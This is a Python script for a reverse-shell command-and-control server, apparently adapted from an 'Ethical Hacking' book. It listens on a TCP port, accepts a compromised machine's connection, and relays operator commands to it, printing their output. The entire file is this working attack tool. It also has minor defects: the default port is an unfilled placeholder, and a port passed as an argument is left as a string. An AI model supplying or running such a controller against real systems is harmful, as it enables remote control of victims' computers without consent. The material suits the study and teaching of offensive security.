#!/usr/bin/env python3
# Scripted to run on python3

"""
Description: CNC server (command and control)
Reverse Shell script (server) as laid out in the book "Ethical Hacking". Made some adjustments of my own as well.
"""
import sys
from socket import *
serverPort = sys.argv[1] if len(sys.argv) > 1 else int('<cnc_port>') # Use port 8000 by default

# Create client IPv4 (AF_INET) TCPSocket (SOCK_STREAM)
# Using IPv4 TCP Socket to match client socket
serverSocket = socket(AF_INET, SOCK_STREAM)

# Reuse previously-used socket if one exists
serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

# Binding the port - leaving IP blank so it uses default on host machine
serverSocket.bind(('', serverPort))

# Listen for incoming connections
serverSocket.listen(1)

print("Awaiting connections... (enter 'exit' to disconnect)")

# Create/Return socket obj after socket conn
connectionSocket, addr = serverSocket.accept()
print("Connected to {}!".format(str(addr)))

# Get/print message
message = connectionSocket.recv(1024)
print("Message received: {}".format(str(message)))

command = ""

while command != "exit":
    command = input("Enter a command: ")
    connectionSocket.send(command.encode())
    try:
        message = connectionSocket.recv(1024).decode()
        print(message)
    except:
        print("Could not get command output.")

connectionSocket.shutdown(SHUT_RDWR)
connectionSocket.close()
